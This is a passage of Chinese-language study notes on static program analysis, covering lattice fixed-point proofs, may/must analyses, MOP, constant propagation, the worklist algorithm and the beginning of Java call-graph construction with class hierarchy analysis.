<li><p>然后是证明求得的不动点是最小不动点，还是不太理解提到的数学归纳法，既然从<code>⊥</code>开始做<code>f</code>，那么到某个<code>k</code>就必定存在不动点，那么将<code>x</code>也做<code>k</code>个<code>f</code>不就好了吗。</p>
<p>假定存在其他的不动点<code>x</code>，那么有<code>x = f(x),⊥⊑x</code><br>$$<br>\begin{align}<br>&amp;\because\forall x,y\in L,x\subseteq y =&gt; f(x)\subseteq f(y)(Monntonicity)\<br>&amp;\therefore f(⊥)\subseteq f(x)\<br>&amp;\therefore f^2(⊥)\subseteq f^2(x)…f^i(x)\subseteq f^i(x)\<br>&amp;\because \exist k,f^k(⊥) =  f^{Fix}\<br>&amp;\therefore f^{Fix} = f^k(⊥) \subseteq f^k(x)=x\<br>\end{align}<br>$$<br>那么就代表通过<code>⊥</code>求得的不动点一定是最小不动点，这里和李樾老师不一样，我也不知道能不能这么写，老师原版是数学归纳法<code>induction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231182008327.png" alt="image-20221231182008327"></p>
</li>
</ul>

        <h4 id="最大不动点"   >
          <a href="#最大不动点" class="heading-link"><i class="fas fa-link"></i></a><a href="#最大不动点" class="headerlink" title="最大不动点"></a>最大不动点</h4>
      
        <h5 id="含义-1"   >
          <a href="#含义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#含义-1" class="headerlink" title="含义"></a>含义</h5>
      <p>$$<br>f(T),f(f(T)),…..,f^k(T)会达到最大不动点<br>$$</p>

        <h5 id="证明-1"   >
          <a href="#证明-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明-1" class="headerlink" title="证明"></a>证明</h5>
      <p>证明和最小不动点证明类似</p>

        <h2 id="5-应用"   >
          <a href="#5-应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-应用" class="headerlink" title="5.应用"></a>5.应用</h2>
      <p>这里把老师上课讲的放到最后了</p>

        <h3 id="理论应用"   >
          <a href="#理论应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#理论应用" class="headerlink" title="理论应用"></a>理论应用</h3>
      <p>即依据<code>Lattice</code>的定义，将之前提到的算法中</p>
<ul>
<li><p>需要求的所有的<code>OUT/IN</code>当作一个元素<code>V(111..0000...)</code>，依据相关性质可知道该元素<code>V</code>为一个<code>Complete Lattice</code>，任意子集都有最大下界和最小上界，并且<code>finite</code><br>$$<br>&amp;OUT[B_1]&amp;OUT[B_2]&amp;…&amp;OUT[B_n]\<br>&amp;V_1 &amp;V_2&amp;…&amp;V_n<br>$$</p>
</li>
<li><p>将<code>Transfer function</code>作为刚刚提到的给定的<code>f</code>函数，其单调性需要证明，**(这里好像还没有证明)**那么每迭代一轮，就相当于对所有的<code>IN/OUT</code>做一次<code>Transfer function</code>。</p>
</li>
<li><p>将每一次迭代结果合并为一个集合<code>Xi</code>，可知该集合为一个<code>Product Lattice</code>，此外该<code>Product Lattice Xi(finite)</code>中所有元素均为一个<code>Complete Lattice</code>，那么该<code>Xi</code>也是一个<code>Complete Lattice</code>，然后加入<code>Transfer function</code>可得如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231183658759.png" alt="image-20221231183658759"></p>
</li>
</ul>
<p>那么即可用到<code>Fixed-Point Theorem</code>(不动点)理论来求最终结果，回答如下问题</p>

        <h3 id="问题"   >
          <a href="#问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#问题" class="headerlink" title="问题"></a>问题</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231184741275.png" alt="image-20221231184741275"></p>
<ul>
<li>算法是否能够确保有解，可达不动点？</li>
<li>是否只有一个不动点，通过算法求解得到的不动点是否是最好的？</li>
<li>什么时候可以达到不动点？</li>
</ul>
<p>🔺<strong>mark：好像后面两个问题还没有解决</strong></p>

        <h1 id="五、Data-Flow-Analysis-Foundations-II"   >
          <a href="#五、Data-Flow-Analysis-Foundations-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、Data-Flow-Analysis-Foundations-II" class="headerlink" title="五、Data Flow Analysis - Foundations II"></a>五、Data Flow Analysis - Foundations II</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105134416.png" alt="image-20230114105134416"></p>

        <h2 id="1-Prove-Function-F-is-Monotonic"   >
          <a href="#1-Prove-Function-F-is-Monotonic" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Prove-Function-F-is-Monotonic" class="headerlink" title="1.Prove Function F is Monotonic"></a>1.Prove Function F is Monotonic</h2>
      
        <h3 id="分析："   >
          <a href="#分析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3>
      <p>一般而言<code>F</code>形式为<code>OUT/IN = gen ⊓/⊔ (IN/OUT - kill)</code></p>
<p>由于对于每一个基本块<code>BB</code>而言，<code>gen</code>和<code>kill</code>都是固定的，即为单调的常数，所以这里的需要证明的就是<code>⊓/⊔</code>是否为单调的，先证明<code>⊔</code>为单调，证明方法对<code>⊓</code>同理</p>

        <h3 id="证明如下："   >
          <a href="#证明如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明如下：" class="headerlink" title="证明如下："></a>证明如下：</h3>
      <p><code>⊔</code>定义：求任意两个元素的最小上界</p>
<p>想要证明<code>⊔</code>为单调，即转化为证明如下结论<br>$$<br>\forall x,y,z\in L,x\subseteq y\ =&gt;\ x⊔z\subseteq y⊔z<br>$$<br>证明过程：<br>$$<br>\begin{align}<br>&amp;\therefore y⊔z\ is\ an\ least\ upper\ bound\ of\  y\<br>&amp;\therefore y\subseteq y⊔z\<br>&amp;\because x\subseteq y\<br>&amp;\therefore x\subseteq y⊔z\ =&gt;\ y⊔z\ is\ an\ upper\  bound\ of\ x  \<br>&amp;\because x⊔z\ is\ an\ least\ upper\ bound\ of\ x\<br>&amp;\therefore x⊔z\subseteq y⊔z<br>\end{align}<br>$$<br>证毕</p>
<p>那么即可得到对于每一个基本块的<code>Function F</code>是单调的，由于每次迭代的时候的<code>f</code>即代表对每一个基本块做<code>Function F</code>，所以<code>f</code>也是单调的。</p>

        <h2 id="2-Time-Complexity"   >
          <a href="#2-Time-Complexity" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Time-Complexity" class="headerlink" title="2.Time Complexity"></a>2.Time Complexity</h2>
      <p>即什么时候到达不动点</p>
<ul>
<li><p>偏序集高度<code>h</code>定义，从<code>Top</code>到<code>Bottom</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103115752131.png" alt="image-20230103115752131"></p>
</li>
</ul>
<p>那么一个算法中有个<code>k</code>个<code>node</code>，最坏情况就是，每次迭代，只有一个<code>node</code>的一个<code>bit</code>从<code>0-&gt;1</code>。而<code>bit</code>的数量其实就是偏序集的高度<code>h</code>，从而得到最坏的情况就是迭代<code>h*k</code>次，从而把所有<code>node</code>的所有<code>bit</code>都从<code>0-&gt;1</code>，时间复杂度即为<code>h*k</code>。</p>

        <h2 id="3-May-and-Must-Analyses-a-Lattice-View"   >
          <a href="#3-May-and-Must-Analyses-a-Lattice-View" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-May-and-Must-Analyses-a-Lattice-View" class="headerlink" title="3.May and Must Analyses,a Lattice View"></a>3.May and Must Analyses,a Lattice View</h2>
      <p>将一个<code>Lattice</code>抽象称一个图形，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103154826254.png" alt="image-20230103154826254"></p>
<p><code>May Analysis/Must Analysis</code>基本都是从<code>unsafe-&gt;safe</code>的过程，也就是<code>safe-approximation</code>主要就是如下的图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103164006781.png" alt="image-20230103164006781"></p>
<ul>
<li><code>May</code>：<ul>
<li>从<code>Bottom-&gt;Top</code>，从不准确到准确，达到<code>Least Fixed Point</code>。</li>
<li>比如<code>Reaching Definition</code>，<code>unSafe</code>就是<code>No definitions can reach</code>到<code>safe</code>，也就是<code>All definitions may reach</code>的过程。 </li>
</ul>
</li>
<li><code>Must</code>：<ul>
<li>从<code>Top-&gt;Bottom</code>，也是从不准确到准确，达到<code>Greatest Fixed Point</code>。</li>
<li>比如<code>Expressions available</code>，它的<code>safe</code>就必须是<code>No expressions are available</code>。因为误报了一个<code>expression</code>是<code>available</code>的话，那么整个程序优化之后就会出错，所以它的<code>safe</code>只能是<code>No expressions are available</code>，然后即可推得其他的。</li>
</ul>
</li>
</ul>
<p>大概是懂了，但是如果再来设计一个算法，是依据什么原则或者什么方法来将它设计成<code>Must</code>还是<code>May</code>呢。</p>
<p>比如活跃变量分析，其应用通常是用来提高寄存器利用率的，用来求<code>dead</code>变量的，就算求不出来<code>dead</code>变量，其实对程序实际的运行结果并不会造成影响，所以应该设计成<code>May</code>。<strong>但是能不能设计成<code>Must</code>呢？</strong>设计成<code>Must</code>是会出错，还是会导致优化程度不够高呢，好像是后者把。</p>

        <h2 id="4-How-Precise-Is-Our-Solution"   >
          <a href="#4-How-Precise-Is-Our-Solution" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-How-Precise-Is-Our-Solution" class="headerlink" title="4.How Precise Is Our Solution"></a>4.How Precise Is Our Solution</h2>
      
        <h3 id="Meet-Over-All-Paths-Solution-MOP"   >
          <a href="#Meet-Over-All-Paths-Solution-MOP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Meet-Over-All-Paths-Solution-MOP" class="headerlink" title="Meet-Over-All-Paths Solution(MOP)"></a>Meet-Over-All-Paths Solution(MOP)</h3>
      <p>即所有从<code>Entry</code>到该某点<code>Si</code>的<code>Path</code>的一些运算</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103170419300.png" alt="image-20230103170419300"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOP[Si] = ⊔/⊓  Fp(OUT[Entry])</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Fp</code>代表从<code>Entry</code>到<code>Si</code>某条路径的所有<code>Transfer funstion</code>的一个集合函数。比如有一条路径为<code>Entry-&gt;S1-&gt;S2-&gt;...-&gt;Si</code>，那么整条路径从<code>Entry-&gt;Si-1</code>可得<code>OUT[Si-1] = Fp(OUT[Entry])</code></p>
<p><code>MOP[Si]</code>即求所有路径（当然不同路径的<code>Si-1</code>可能不同）到<code>Si</code>的一个<code>meet/join</code>，也就是将不同路径的<code>OUT[Si-1]</code>做一个<code>meet/join</code>操作。</p>
<p>有些<code>Path</code>在实际的动态运行过程中可能不存在，但是在静态分析时会将之归入进来计算。</p>

        <h3 id="MOP-vs-Ours-Iterative-Algorithm"   >
          <a href="#MOP-vs-Ours-Iterative-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#MOP-vs-Ours-Iterative-Algorithm" class="headerlink" title="MOP vs Ours(Iterative Algorithm)"></a>MOP vs Ours(Iterative Algorithm)</h3>
      <p>假定如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103173750413.png" alt="image-20230103173750413"></p>
<p>依据定义可分别得到对应的结果<br>$$<br>\begin{align}<br>&amp;Ours[S4]=IN[S4]=f_{s3}(f_{s1}(OUT[Entry])⊔f_{s2}(OUT[Entry]))\<br>&amp;MOP[S4]=IN[S4]=f_{s3}(f_{s1}(OUT[Entry]))⊔f_{s3}(f_{s2}(OUT[Entry]))<br>\end{align}<br>$$<br>其中<code>fs1(OUT[Entry])</code>和<code>fs2(OUT[Entry])</code>是一样的，那么将之抽象为<code>x</code>和<code>y</code>，<code>fs3</code>抽象为<code>F</code>可得简化后的结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ours = F(x⊔y)</span><br><span class="line">MOP  = F(x)⊔F(y)</span><br></pre></td></tr></table></div></figure>

<p>证明一下两者的关系<br>$$<br>\begin{align}<br>&amp;\therefore x\subseteq x⊔y\ and\ y\subseteq x⊔y\<br>&amp;\because ∀x,y\in L,x\subseteq y =&gt; F(x)\subseteq F(y)(Monotonic)\<br>&amp;\therefore F(x)\subseteq F(x⊔y)\ and\ F(x)\subseteq F(x⊔y)\<br>&amp;\therefore F(x⊔y)\ is\ an\ upper\ bound\ of\ F(x)\ and\ F(y)\<br>&amp;\because F(x)⊔F(y)\ is\ an\ least\ upper\ bound\ of\ F(x)\ and F(y)\<br>&amp;\therefore F(x)⊔F(y)\subseteq F(x⊔y)\<br>&amp;\therefore MOP\subseteq Ours<br>\end{align}<br>$$<br>又因为如下关系图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103164006781.png" alt="image-20230103164006781"></p>
<p>在<code>may analysis</code>中，越接近上界越不准确，所以<code>Ours</code>比<code>MOP</code>更加不准确</p>
<p>但是如果满足<code>Transfer function F </code>是<code>distributive</code>（可分配的），即分配律，那么可得<code>F(x⊔y) = F(x)⊔F(y)</code>的，那么<code>MOP=Ours</code>。即当<code>Transfer function</code>是可分配的，即代表<code>MOP</code>其实是等价于<code>Ours</code>的。</p>
<p><strong>有个结论：</strong></p>
<p><code>Bit-vector or Gen/Kill problems (set union/intersection for join/meet) are distributive</code></p>
<p>就是前面提到的关于<code>Bit-Vector</code>方法定义的，或者是<code>Gen/Kill</code>定义的<code>Transfer function</code>都是可以分配的</p>

        <h2 id="5-Constant-Propagation"   >
          <a href="#5-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Constant-Propagation" class="headerlink" title="5.Constant Propagation"></a>5.Constant Propagation</h2>
      <p>使用的是<code>MOP</code></p>

        <h3 id="Data-Flow-Facts-3"   >
          <a href="#Data-Flow-Facts-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-3" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有的变量是否为常量都表达为一个组合<code>pairs</code>，即<code>(x,v)</code>，也就是当前经过<code>node</code>之后的<code>OUT</code>中该变量<code>x</code>的值<code>v</code></p>

        <h3 id="Control-Flow-3"   >
          <a href="#Control-Flow-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-3" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>和<code>Expression Analysis</code>一样，应该是<code>Must</code>的，因为<code>safe</code>的时候，应该是所有变量都不是常量，对应在<code>Bottom</code>，也就是<code>NAC(Not an constant)</code>。而由于是组合键值<code>pair</code>形式，所以<code>Top</code>应该是<code>undefine</code>，也就是<code>UNDEF</code>形式，最终如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104113135782.png" alt="image-20230104113135782"></p>
<p>然后需要设计一下<code>Meet</code>操作，表达式同样类似</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ⊓p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>一个变量<code>v</code>与另一个进来的值对应的无非如下几种情况</p>
<ul>
<li><p><code>v ⊓ UNDEF = v</code></p>
<p>没定义的碰见另一个，当然直接相当于另一个了</p>
</li>
<li><p><code>v ⊓ NAC = NAC</code></p>
<p>既然已经确定不是常量，那么无论另一边值是啥，该变量必定不是常量了</p>
</li>
<li><p><code>v ⊓ constant</code></p>
<ul>
<li><p><code>c ⊓ c = c</code></p>
<p>两边均为常量才是常量</p>
</li>
<li><p><code>c1 ⊓ c2 = NAC</code></p>
<p>两边值不同就不是常量了</p>
</li>
<li><p><code>UNDEF ⊓ c = c</code>(和前面一样)</p>
</li>
<li><p><code>NAC ⊓ c = NAC</code>(和前面一样)</p>
</li>
</ul>
</li>
</ul>

        <h3 id="Transfer-Function-3"   >
          <a href="#Transfer-Function-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-3" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F: OUT[s] = gen⊔(IN[s] - &#123;(x, _)&#125;)</span><br></pre></td></tr></table></div></figure>

<p>即需要去掉所有其他<code>node</code>中关于变量<code>x</code>的键值对<code>pair</code>，然后加上当前生成的变量键值对<code>pair</code>。</p>
<p>使用函数<code>val(x)</code>来求对应<code>x</code>的值，然后对应不同的<code>statement</code>有如下情况</p>
<ul>
<li><code>s : x = constant;</code></li>
<li><code>s : x = y;</code></li>
<li><code>s : x = y op z;</code><ul>
<li><code>f(y,z) = val(y) op val(z) //val(y)和val(z)都是常量时</code></li>
<li><code>f(y,z) = NAC   //val(y)或者val(z)有一个是NAC时</code></li>
<li><code>f(y,z) = UNDEF  //其他情况</code></li>
</ul>
</li>
</ul>
<p> 是一个<code>Nondistributivity</code>，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104123407058.png" alt="image-20230104123407058"></p>

        <h3 id="Worklist-Algorithm"   >
          <a href="#Worklist-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h3>
      <p>一个<code>Iterative Algorithm</code>的优化算法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104174021024.png" alt="image-20230104174021024"></p>
<p><code>Iterative Algorithm</code>只要变化了一个，其他的都会重新计算，而<code>Worklist Algorithm</code>是只计算当前轮次变化的<code>OUT[B]</code>以及后续的<code>OUT[B]</code>，相当于用空间换取时间。</p>
<p>原因就是一个<code>Transfer function</code>，<code>IN[]</code>没有变，那么<code>OUT[]</code>肯定也是没有变。</p>
<p>主要是图中黄色的部分，相比于<code>Iterative Algorithm</code>是有些改变的。</p>

        <h2 id="Foundations总结"   >
          <a href="#Foundations总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#Foundations总结" class="headerlink" title="Foundations总结"></a>Foundations总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104175311848.png" alt="image-20230104175311848"></p>
<p><code>Iterative algorithm</code>、<code>Lattice</code>定义、不动点理论、<code>may/must</code>分析、<code>MOP</code>和<code>Iterative algorithm</code>的异同比较、常量分析、<code>Worklist algorithm</code></p>

        <h1 id="六、Interprocedural-Analysis"   >
          <a href="#六、Interprocedural-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、Interprocedural-Analysis" class="headerlink" title="六、Interprocedural Analysis"></a>六、Interprocedural Analysis</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105227045.png" alt="image-20230114105227045"></p>
<p>之前学的都是过程内分析<code>intraprocedural analysis</code>，接下来要学习过程间分析<code>Interprocedural Analysis</code>，即函数调用的相关分析</p>

        <h2 id="1-Motivation"   >
          <a href="#1-Motivation" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p>如果不进行相关的<code>Interprocedural Analysis</code>，那么当遇到函数调用时，通常解决办法都是<code>safe-approximation</code>，也就是将之判定为一个<code>safe</code>地方的<code>Facts</code>。比如对于<code>Constant Analysis</code>而言，就会函数调用返回的结果判定为<code>NAC</code>，更加安全。</p>

        <h3 id="一些定义："   >
          <a href="#一些定义：" class="heading-link"><i class="fas fa-link"></i></a><a href="#一些定义：" class="headerlink" title="一些定义："></a>一些定义：</h3>
      <p>如下所示，在函数之前存在相关的<code>call edges</code>，以及<code>return edges</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104181215325.png" alt="image-20230104181215325"></p>

        <h2 id="2-Call-Graph-Construction"   >
          <a href="#2-Call-Graph-Construction" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Call-Graph-Construction" class="headerlink" title="2.Call Graph Construction"></a>2.Call Graph Construction</h2>
      
        <h3 id="定义"   >
          <a href="#定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义" class="headerlink" title="定义"></a>定义</h3>
      <p>调用图是程序中一个函数调用边<code>call edges</code>集合，比如如下所示，左边为程序，右边即为它的调用图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105112459293.png" alt="image-20230105112459293"></p>

        <h3 id="面向对象语言调用图常见算法"   >
          <a href="#面向对象语言调用图常见算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#面向对象语言调用图常见算法" class="headerlink" title="面向对象语言调用图常见算法"></a>面向对象语言调用图常见算法</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105112753506.png" alt="image-20230105112753506"></p>

        <h2 id="3-Method-Calls-Invocations-in-Java"   >
          <a href="#3-Method-Calls-Invocations-in-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Method-Calls-Invocations-in-Java" class="headerlink" title="3.Method Calls (Invocations) in Java"></a>3.Method Calls (Invocations) in Java</h2>
      <p>在<code>JAVA</code>中通常存在三种调用方法，而在<code>JAVA8</code>中还引入了<code>invokedynamic</code>，这个是特殊用途，不讨论</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105113339502.png" alt="image-20230105113339502"></p>
<p>主要是对于<code>Vitual call</code>，一个调用由于传入的对象不同，可能对应不同的方法。这个是实现<code>OO(Object-Oriented)</code>语言中多态<code>polymorphism</code>的关键点，也是静态分析中的难点。</p>

        <h3 id="Method-Dispatch-of-Vitual-Calls"   >
          <a href="#Method-Dispatch-of-Vitual-Calls" class="heading-link"><i class="fas fa-link"></i></a><a href="#Method-Dispatch-of-Vitual-Calls" class="headerlink" title="Method Dispatch of Vitual Calls"></a>Method Dispatch of Vitual Calls</h3>
      
        <h4 id="定义-1"   >
          <a href="#定义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4>
      <p>即程序运行时动态求解<code>Vitual Calls</code>动态函数方法的过程，就叫做<code>Method Dispatch</code>，求解一般需要以下两个要素</p>
<ul>
<li>传入对象的类型</li>
<li>函数签名，<code>call site</code>不知道啥意思<ul>
<li><code>Signature = class type + method name + descriptor</code><ul>
<li><code>descriptor = return type + parameter types</code></li>
</ul>
</li>
</ul>
</li>
</ul>

        <h4 id="Dispatch-Function-Defination"   >
          <a href="#Dispatch-Function-Defination" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dispatch-Function-Defination" class="headerlink" title="Dispatch Function Defination"></a>Dispatch Function Defination</h4>
      <p>依据<code>Method Dispatch</code>定义来确定对应方法定义</p>
<ul>
<li><code>c</code>：即<code>class</code>，传入对象的类型</li>
<li><code>m</code>：即函数签名</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105115219367.png" alt="image-20230105115219367"></p>
<p><code>Dispatch</code>是寻找可以调用的函数，那么可以调用的函数一定是要确保该函数是有具体的函数体的，不能是抽象的<code>non-abstract</code></p>

        <h4 id="例子-3"   >
          <a href="#例子-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105115458209.png" alt="image-20230105115458209"></p>
<ul>
<li><code>Dispatch(B,A.foo())</code>：先从<code>B</code>中找，找不到就找父类，也就是<code>A</code>，从<code>A</code>中获取到<code>foo</code>函数。</li>
<li><code>Dispathc(C,A.foo())</code>：先从<code>C</code>中找，直接找到，那么即为<code>c</code>中的<code>foo</code>函数。</li>
</ul>

        <h2 id="4-Class-Hierarchy-Analysis-CHA"   >
          <a href="#4-Class-Hierarchy-Analysis-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Class-Hierarchy-Analysis-CHA" class="headerlink" title="4.Class Hierarchy Analysis(CHA)"></a>4.Class Hierarchy Analysis(CHA)</h2>
      <ul>
<li>需要一个类的相关继承结构</li>
<li>求解一个<code>vitural call</code>依据于定义类型和传入的对象</li>
</ul>

        <h3 id="Call-Resolution-of-CHA"   >
          <a href="#Call-Resolution-of-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Resolution-of-CHA" class="headerlink" title="Call Resolution of CHA"></a>Call Resolution of CHA</h3>
      <p>定义方法<code>Resolve(cs)</code>为具体算法分析实例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105120933460.png" alt="image-20230105120933460"></p>
<p>其中</p>
<ul>
<li><code>cs</code> : 当前分析的语句</li>
<li><code>m </code> : 函数签名 </li>
<li><code>c^m</code> : <code>m</code>对应的类型</li>
</ul>
<p>具体分析一下</p>

        <h4 id="static-call"   >
          <a href="#static-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#static-call" class="headerlink" title="static call"></a>static call</h4>
      <p>例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;....&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C.foo(x,y);</span><br></pre></td></tr></table></div></figure>

<p>可得对应变量含义<br>$$<br>\begin{align}<br>&amp;cs : C.foo(x,y); &amp;//当前需要方法解析语句\<br>&amp;m : &lt;C: T\ foo(P,Q)&gt; &amp;//函数签名\<br>\end{align}<br>$$<br>直接返回了对应函数签名的<code>m</code></p>

        <h4 id="speciall-call"   >
          <a href="#speciall-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#speciall-call" class="headerlink" title="speciall call"></a>speciall call</h4>
      
        <h5 id="superclass-instance-methods"   >
          <a href="#superclass-instance-methods" class="heading-link"><i class="fas fa-link"></i></a><a href="#superclass-instance-methods" class="headerlink" title="superclass instance methods"></a>superclass instance methods</h5>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">super</span>.foo(p,q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可得对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:super.foo(p,q);\<br>&amp;m:&lt;B: T\ foo(P,Q)&gt;\<br>&amp;c^m:B<br>\end{align}<br>$$<br>由于是<code>super</code>，所以对应对象类型为<code>B</code>。同时需要注意的是这里不能把<code>super</code>直接替换为<code>B</code>，因为可能<code>B</code>中没有定义<code>foo</code>函数，而是在其父类中定义，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105122718787.png" alt="image-20230105122718787"></p>

        <h5 id="Constructors-Private-instance-mthods"   >
          <a href="#Constructors-Private-instance-mthods" class="heading-link"><i class="fas fa-link"></i></a><a href="#Constructors-Private-instance-mthods" class="headerlink" title="Constructors/Private instance mthods"></a>Constructors/Private instance mthods</h5>
      <p>这两个可以放到一起</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class C extends B&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">this</span>.bar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> T <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function">C c </span>= <span class="keyword">new</span> C();</span><br></pre></td></tr></table></div></figure>

<p>对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:this.bar();\<br>&amp;m:&lt;C:T\ bar()&gt;\<br>&amp;c^m:C\<br>\<br>&amp;cs:C\ c\ =\ new\ c();\<br>&amp;m:&lt;&gt;<br>\end{align}<br>$$<br>这个可以直接找到，不细说</p>

        <h4 id="vitural-call"   >
          <a href="#vitural-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#vitural-call" class="headerlink" title="vitural call"></a>vitural call</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;....&#125;</span><br><span class="line">&#125;</span><br><span class="line">A a = ...;</span><br><span class="line">a.foo(x,y);</span><br></pre></td></tr></table></div></figure>

<p>对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:a.foo(x,y);\<br>&amp;m:&lt;A:\ T\ foo(P,Q)&gt;\<br>&amp;c:A\<br>\end{align}<br>$$<br>其中关于该算法</p>
